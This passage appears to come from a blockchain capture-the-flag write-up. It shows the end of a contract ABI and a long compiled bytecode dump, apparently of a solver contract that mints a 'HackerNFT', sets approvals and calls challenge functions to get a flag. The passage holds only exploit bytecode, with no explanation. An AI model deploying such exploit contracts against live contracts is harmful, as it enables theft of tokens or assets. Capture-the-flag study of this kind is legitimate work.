class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;address&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;uint256&#39;</span><span class=p>},</span> <span class=p>{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes&#39;</span><span class=p>}],</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;onERC721Received&#39;</span><span class=p>,</span> <span class=s1>&#39;outputs&#39;</span><span class=p>:</span> <span class=p>[{</span><span class=s1>&#39;internalType&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes4&#39;</span><span class=p>,</span> <span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;bytes4&#39;</span><span class=p>}],</span> <span class=s1>&#39;stateMutability&#39;</span><span class=p>:</span> <span class=s1>&#39;pure&#39;</span><span class=p>,</span> <span class=s1>&#39;type&#39;</span><span class=p>:</span> <span class=s1>&#39;function&#39;</span><span class=p>}]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>Bytecode</span><span class=p>]</span><span class=mi>60806040523480156200001157600080</span><span class=n>fd5b50604051620056f7380380620056f7833981810160405281019062000037919062000856565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cee092e86040518163ffffffff1660e01b8152600401602060405180830381865afa158015620000e3573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001099190620008cd565b600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a22cb46560008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016040518363ffffffff1660e01b8152600401620001c99291906200092d565b600060405180830381600087803b158015620001e457600080fd5b505af1158015620001f9573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663144c7cc76040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000269573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200028f91906200099f565b600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016200036e929190620009ec565b6020604051808303816000875af11580156200038e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620003b4919062000a4a565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632b7ac3f36040518163ffffffff1660e01b8152600401602060405180830381865afa15801562000421573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000447919062000ac1565b600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1633604051620004da90620007de565b620004e89392919062000af3565b604051809103906000f08015801562000505573d6000803e3d6000fd5b50600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060016040518363ffffffff1660e01b8152600401620005a692919062000b7d565b600060405180830381600087803b158015620005c157600080fd5b505af1158015620005d6573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060026040518363ffffffff1660e01b81526004016200063a92919062000bed565b600060405180830381600087803b1580156200065557600080fd5b505af11580156200066a573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166340c10f193060036040518363ffffffff1660e01b8152600401620006ce92919062000c5d565b600060405180830381600087803b158015620006e957600080fd5b505af1158015620006fe573d6000803e3d6000fd5b50505050600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a22cb4653360016040518363ffffffff1660e01b8152600401620007629291906200092d565b600060405180830381600087803b1580156200077d57600080fd5b505af115801562000792573d6000803e3d6000fd5b5050505033600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505062000c8a565b613463806200229483390190565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006200081e82620007f1565b9050919050565b620008308162000811565b81146200083c57600080fd5b50565b600081519050620008508162000825565b92915050565b6000602082840312156200086f576200086e620007ec565b5b60006200087f848285016200083f565b91505092915050565b6000620008958262000811565b9050919050565b620008a78162000888565b8114620008b357600080fd5b50565b600081519050620008c7816200089c565b92915050565b600060208284031215620008e657620008e5620007ec565b5b6000620008f684828501620008b6565b91505092915050565b6200090a8162000811565b82525050565b60008115159050919050565b620009278162000910565b82525050565b6000604082019050620009446000830185620008ff565b6200095360208301846200091c565b9392505050565b6000620009678262000811565b9050919050565b62000979816200095a565b81146200098557600080fd5b50565b60008151905062000999816200096e565b92915050565b600060208284031215620009b857620009b7620007ec565b5b6000620009c88482850162000988565b91505092915050565b6000819050919050565b620009e681620009d1565b82525050565b600060408201905062000a036000830185620008ff565b62000a126020830184620009db565b9392505050565b62000a248162000910565b811462000a3057600080fd5b50565b60008151905062000a448162000a19565b92915050565b60006020828403121562000a635762000a62620007ec565b5b600062000a738482850162000a33565b91505092915050565b600062000a898262000811565b9050919050565b62000a9b8162000a7c565b811462000aa757600080fd5b50565b60008151905062000abb8162000a90565b92915050565b60006020828403121562000ada5762000ad9620007ec565b5b600062000aea8482850162000aaa565b91505092915050565b600060608201905062000b0a6000830186620008ff565b62000b196020830185620008ff565b62000b286040830184620008ff565b949350505050565b6000819050919050565b6000819050919050565b600062000b6562000b5f62000b598462000b30565b62000b3a565b620009d1565b9050919050565b62000b778162000b44565b82525050565b600060408201905062000b946000830185620008ff565b62000ba3602083018462000b6c565b9392505050565b6000819050919050565b600062000bd562000bcf62000bc98462000baa565b62000b3a565b620009d1565b9050919050565b62000be78162000bb4565b82525050565b600060408201905062000c046000830185620008ff565b62000c13602083018462000bdc565b9392505050565b6000819050919050565b600062000c4562000c3f62000c398462000c1a565b62000b3a565b620009d1565b9050919050565b62000c578162000c24565b82525050565b600060408201905062000c746000830185620008ff565b62000c83602083018462000c4c565b9392505050565b6115fa8062000c9a6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c8063150b7a021461005c5780635ac174d01461008c578063772b508314610096578063bb3ee56d146100b4578063e4db78d7146100be575b600080fd5b61007660048036038101906100719190610c73565b6100da565b6040516100839190610d31565b60405180910390f35b6100946100ee565b005b61009e61033c565b6040516100ab9190610d65565b60405180910390f35b6100bc610492565b005b6100d860048036038101906100d39190610de5565b610652565b005b600063150b7a0260e01b9050949350505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635764950f600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016105396040518463ffffffff1660e01b815260040161017093929190610ec7565b600060405180830381600087803b15801561018a57600080fd5b505af115801561019e573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860016040518263ffffffff1660e01b81526004016101fc9190610efe565b600060405180830381600087803b15801561021657600080fd5b505af115801561022a573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860016040518263ffffffff1660e01b81526004016102889190610efe565b600060405180830381600087803b1580156102a257600080fd5b505af11580156102b6573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663473ca96c6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561032257600080fd5b505af1158015610336573d6000803e3d6000fd5b50505050565b6000806040518060600160405280600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001600381526020016001815250905060006040518060a001604052806003815260200160018152602001600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020013073ffffffffffffffffffffffffffffffffffffffff1681526020016040518060400160405280601081526020017f77616e7420746f2067657420666c61670000000000000000000000000000000081525081525090506000816040015182606001518484602001518560800151604051602001610471959493929190611194565b60405160208183030381529060405280519060200120905080935050505090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633884d6356040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156104fc57600080fd5b505af1158015610510573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636495b22860006040518263ffffffff1660e01b815260040161056e919061128d565b600060405180830381600087803b15801561058857600080fd5b505af115801561059c573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016040518363ffffffff1660e01b815260040161061e9291906112a8565b600060405180830381600087803b15801561063857600080fd5b505af115801561064c573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001806040518463ffffffff1660e01b81526004016106d2939291906112d1565b6020604051808303816000875af11580156106f1573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610715919061131d565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600360016040518463ffffffff1660e01b815260040161079793929190611385565b6020604051808303816000875af11580156107b6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107da919061131d565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663acfee8ed600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001806040518463ffffffff1660e01b815260040161085b939291906112d1565b6020604051808303816000875af115801561087a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061089e919061131d565b5060006040518060600160405280600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001600381526020016001815250905060006040518060a001604052806003815260200160018152602001600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020013073ffffffffffffffffffffffffffffffffffffffff1681526020016040518060400160405280601081526020017f77616e7420746f2067657420666c6167000000000000000000000000000000008152508152509050600060405180604001604052808760ff16815260200160405180604001604052808881526020018781525081525090506000604051806040016040528084815260200183815250905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b40da948826040518263ffffffff1660e01b8152600401610a4a91906115a2565b600060405180830381600087803b158015610a6457600080fd5b505af1158015610a78573d6000803e3d6000fd5b5050505050505050505050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610ac482610a99565b9050919050565b610ad481610ab9565b8114610adf57600080fd5b50565b600081359050610af181610acb565b92915050565b6000819050919050565b610b0a81610af7565b8114610b1557600080fd5b50565b600081359050610b2781610b01565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b610b8082610b37565b810181811067ffffffffffffffff82111715610b9f57610b9e610b48565b5b80604052505050565b6000610bb2610a85565b9050610bbe8282610b77565b919050565b600067ffffffffffffffff821115610bde57610bdd610b48565b5b610be782610b37565b9050602081019050919050565b82818337600083830152505050565b6000610c16610c1184610bc3565b610ba8565b905082815260208101848484011115610c3257610c31610b32565b5b610c3d848285610bf4565b509392505050565b600082601f830112610c5a57610c59610b2d565b5b8135610c6a848260208601610c03565b91505092915050565b60008060008060808587031215610c8d57610c8c610a8f565b5b6000610c9b87828801610ae2565b9450506020610cac87828801610ae2565b9350506040610cbd87828801610b18565b925050606085013567ffffffffffffffff811115610cde57610cdd610a94565b5b610cea87828801610c45565b91505092959194509250565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b610d2b81610cf6565b82525050565b6000602082019050610d466000830184610d22565b92915050565b6000819050919050565b610d5f81610d4c565b82525050565b6000602082019050610d7a6000830184610d56565b92915050565b600060ff82169050919050565b610d9681610d80565b8114610da157600080fd5b50565b600081359050610db381610d8d565b92915050565b610dc281610d4c565b8114610dcd57600080fd5b50565b600081359050610ddf81610db9565b92915050565b600080600060608486031215610dfe57610dfd610a8f565b5b6000610e0c86828701610da4565b9350506020610e1d86828701610dd0565b9250506040610e2e86828701610dd0565b9150509250925092565b610e4181610ab9565b82525050565b6000819050919050565b6000819050919050565b6000610e76610e71610e6c84610e47565b610e51565b610af7565b9050919050565b610e8681610e5b565b82525050565b6000819050919050565b6000610eb1610eac610ea784610e8c565b610e51565b610af7565b9050919050565b610ec181610e96565b82525050565b6000606082019050610edc6000830186610e38565b610ee96020830185610e7d565b610ef66040830184610eb8565b949350505050565b6000602082019050610f136000830184610e7d565b92915050565b600082825260208201905092915050565b7f492c207468652069737375657200000000000000000000000000000000000000600082015250565b6000610f60600d83610f19565b9150610f6b82610f2a565b602082019050919050565b7f6f666665722061207370656369616c20646973636f756e7420666f7200000000600082015250565b6000610fac601c83610f19565b9150610fb782610f76565b602082019050919050565b7f746f206275790000000000000000000000000000000000000000000000000000600082015250565b6000610ff8600683610f19565b915061100382610fc2565b602082019050919050565b61101781610ab9565b82525050565b61102681610af7565b82525050565b606082016000820151611042600085018261100e565b506020820151611055602085018261101d565b506040820151611068604085018261101d565b50505050565b7f6174000000000000000000000000000000000000000000000000000000000000600082015250565b60006110a4600283610f19565b91506110af8261106e565b602082019050919050565b6110c381610af7565b82525050565b7f6265636175736500000000000000000000000000000000000000000000000000600082015250565b60006110ff600783610f19565b915061110a826110c9565b602082019050919050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561114f578082015181840152602081019050611134565b60008484015250505050565b600061116682611115565b6111708185611120565b9350611180818560208601611131565b61118981610b37565b840191505092915050565b60006101808201905081810360008301526111ae81610f53565b90506111bd6020830188610e38565b81810360408301526111ce81610f9f565b90506111dd6060830187610e38565b81810360808301526111ee81610feb565b90506111fd60a083018661102c565b81810361010083015261120f81611097565b905061121f6101208301856110ba565b818103610140830152611231816110f2565b9050818103610160830152611246818461115b565b90509695505050505050565b6000819050919050565b600061127761127261126d84611252565b610e51565b610af7565b9050919050565b6112878161125c565b82525050565b60006020820190506112a2600083018461127e565b92915050565b60006040820190506112bd6000830185610e38565b6112ca6020830184610e7d565b9392505050565b60006060820190506112e66000830186610e38565b6112f36020830185610e7d565b6113006040830184610e7d565b949350505050565b60008151905061131781610b01565b92915050565b60006020828403121561133357611332610a8f565b5b600061134184828501611308565b91505092915050565b6000819050919050565b600061136f61136a6113658461134a565b610e51565b610af7565b9050919050565b61137f81611354565b82525050565b600060608201905061139a6000830186610e38565b6113a76020830185611376565b6113b46040830184610e7d565b949350505050565b600082825260208201905092915050565b60006113d882611115565b6113e281856113bc565b93506113f2818560208601611131565b6113fb81610b37565b840191505092915050565b600060a08301600083015161141e600086018261101d565b506020830151611431602086018261101d565b506040830151611444604086018261100e565b506060830151611457606086018261100e565b506080830151848203608086015261146f82826113cd565b9150508091505092915050565b61148581610d80565b82525050565b600060029050919050565b600081905092915050565b6000819050919050565b6114b481610d4c565b82525050565b60006114c683836114ab565b60208301905092915050565b6000602082019050919050565b6114e88161148b565b6114f28184611496565b92506114fd826114a1565b8060005b8381101561152e57815161151587826114ba565b9650611520836114d2565b925050600181019050611501565b505050505050565b60608201600082015161154c600085018261147c565b50602082015161155f60208501826114df565b50505050565b600060808301600083015184820360008601526115828282611406565b91505060208301516115976020860182611536565b508091505092915050565b600060208201905081810360008301526115bc8184611565565b90509291505056fea2646970667358221220a7d65bb6c00aa70f0e2dc3f4bb9e8ae881b2558cfcb91c69c6225187e060130964736f6c6343000810003360806040523480156200001157600080fd5b50604051620034633803806200346383398181016040528101906200003791906200052d565b6040518060400160405280600981526020017f4861636b65724e465400000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f4e465400000000000000000000000000000000000000000000000000000000008152508160009081620000b4919062000803565b508060019081620000c6919062000803565b505050620000e9620000dd6200028460201b60201c565b6200028c60201b60201c565b82600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600860006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600960006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600a60006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506200022330600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200035260201b60201c565b6200027b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660016200035260201b60201c565b505050620009a7565b600033905090565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1603620003c3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401620003ba906200094b565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c3183604051620004b691906200098a565b60405180910390a3505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620004f582620004c8565b9050919050565b6200050781620004e8565b81146200051357600080fd5b50565b6000815190506200052781620004fc565b92915050565b600080600060608486031215620005495762000548620004c3565b5b6000620005598682870162000516565b93505060206200056c8682870162000516565b92505060406200057f8682870162000516565b9150509250925092565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806200060b57607f821691505b602082108103620006215762000620620005c3565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026200068b7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff826200064c565b6200069786836200064c565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b6000620006e4620006de620006d884620006af565b620006b9565b620006af565b9050919050565b6000819050919050565b6200070083620006c3565b620007186200070f82620006eb565b84845462000659565b825550505050565b600090565b6200072f62000720565b6200073c818484620006f5565b505050565b5b8181101562000764576200075860008262000725565b60018101905062000742565b5050565b601f821115620007b3576200077d8162000627565b62000788846200063c565b8101602085101562000798578190505b620007b0620007a7856200063c565b83018262000741565b50505b505050565b600082821c905092915050565b6000620007d860001984600802620007b8565b1980831691505092915050565b6000620007f38383620007c5565b9150826002028217905092915050565b6200080e8262000589565b67ffffffffffffffff8111156200082a576200082962000594565b5b620008368254620005f2565b6200084382828562000768565b600060209050601f8311600181146200087b576000841562000866578287015190505b620008728582620007e5565b865550620008e2565b601f1984166200088b8662000627565b60005b82811015620008b5578489015182556001820191506020850194506020810190506200088e565b86831015620008d55784890151620008d1601f891682620007c5565b8355505b6001600288020188555050505b505050505050565b600082825260208201905092915050565b7f4552433732313a20617070726f766520746f2063616c6c657200000000000000600082015250565b600062000933601983620008ea565b91506200094082620008fb565b602082019050919050565b60006020820190508181036000830152620009668162000924565b9050919050565b60008115159050919050565b62000984816200096d565b82525050565b6000602082019050620009a1600083018462000979565b92915050565b612aac80620009b76000396000f3fe608060405234801561001057600080fd5b506004361061010b5760003560e01c806370a08231116100a2578063a22cb46511610071578063a22cb465146102a4578063b88d4fde146102c0578063c87b56dd146102dc578063e985e9c51461030c578063f2fde38b1461033c5761010b565b806370a082311461022e578063715018a61461025e5780638da5cb5b1461026857806395d89b41146102865761010b565b806323b872dd116100de57806323b872dd146101aa57806340c10f19146101c657806342842e0e146101e25780636352211e146101fe5761010b565b806301ffc9a71461011057806306fdde0314610140578063081812fc1461015e578063095ea7b31461018e575b600080fd5b61012a60048036038101906101259190611c13565b610358565b6040516101379190611c5b565b60405180910390f35b61014861043a565b6040516101559190611d06565b60405180910390f35b61017860048036038101906101739190611d5e565b6104cc565b6040516101859190611dcc565b60405180910390f35b6101a860048036038101906101a39190611e13565b610512565b005b6101c460048036038101906101bf9190611e53565b610629565b005b6101e060048036038101906101db9190611e13565b610689565b005b6101fc60048036038101906101f79190611e53565b61069f565b005b61021860048036038101906102139190611d5e565b6106bf565b6040516102259190611dcc565b60405180910390f35b61024860048036038101906102439190611ea6565b6107ea565b6040516102559190611ee2565b60405180910390f35b6102666108a1565b005b6102706108b5565b60405161027d9190611dcc565b60405180910390f35b61028e6108df565b60405161029b9190611d06565b60405180910390f35b6102be60048036038101906102b99190611f29565b610971565b005b6102da60048036038101906102d5919061209e565b610987565b005b6102f660048036038101906102f19190611d5e565b6109e9565b6040516103039190611d06565b60405180910390f35b61032660048036038101906103219190612121565b610a51565b6040516103339190611c5b565b60405180910390f35b61035660048036038101906103519190611ea6565b610ae5565b005b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916148061042357507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610433575061043282610b68565b5b9050919050565b60606000805461044990612190565b80601f016020809104026020016040519081016040528092919081815260200182805461047590612190565b80156104c25780601f10610497576101008083540402835291602001916104c2565b820191906000526020600020905b8154815290600101906020018083116104a557829003601f168201915b5050505050905090565b60006104d782610bd2565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600061051d82610c1d565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff160361058d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161058490612233565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166105ac610ca3565b73ffffffffffffffffffffffffffffffffffffffff1614806105db57506105da816105d5610ca3565b610a51565b5b61061a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610611906122c5565b60405180910390fd5b6106248383610cab565b505050565b61063a610634610ca3565b82610d64565b610679576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161067090612357565b60405180910390fd5b610684838383610df9565b505050565b6106916110f2565b61069b8282611170565b5050565b6106ba83838360405180602001604052806000815250610987565b505050565b6000600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff160361074057600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690506107e5565b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16036107bf57600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690506107e5565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690505b919050565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff160361085a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610851906123e9565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6108a96110f2565b6108b3600061138d565b565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600180546108ee90612190565b80601f016020809104026020016040519081016040528092919081815260200182805461091a90612190565b80156109675780601f1061093c57610100808354040283529160200191610967565b820191906000526020600020905b81548152906001019060200180831161094a57829003601f168201915b5050505050905090565b61098361097c610ca3565b8383611453565b5050565b610998610992610ca3565b83610d64565b6109d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109ce90612357565b60405180910390fd5b6109e3848484846115bf565b50505050565b60606109f482610bd2565b60006109fe61161b565b90506000815111610a1e5760405180602001604052806000815250610a49565b80610a2884611632565b604051602001610a39929190612445565b6040516020818303038152906040525b915050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b610aed6110f2565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610b5c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b53906124db565b60405180910390fd5b610b658161138d565b50565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b610bdb81611700565b610c1a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c1190612547565b60405180910390fd5b50565b600080610c2983611741565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610c9a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c9190612547565b60405180910390fd5b80915050919050565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610d1e83610c1d565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610d7083610c1d565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610db25750610db18185610a51565b5b80610df057508373ffffffffffffffffffffffffffffffffffffffff16610dd8846104cc565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610e1982610c1d565b73ffffffffffffffffffffffffffffffffffffffff1614610e6f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e66906125d9565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1603610ede576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ed59061266b565b60405180910390fd5b610eeb838383600161177e565b8273ffffffffffffffffffffffffffffffffffffffff16610f0b82610c1d565b73ffffffffffffffffffffffffffffffffffffffff1614610f61576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f58906125d9565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a46110ed83838360016118a4565b505050565b6110fa610ca3565b73ffffffffffffffffffffffffffffffffffffffff166111186108b5565b73ffffffffffffffffffffffffffffffffffffffff161461116e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611165906126d7565b60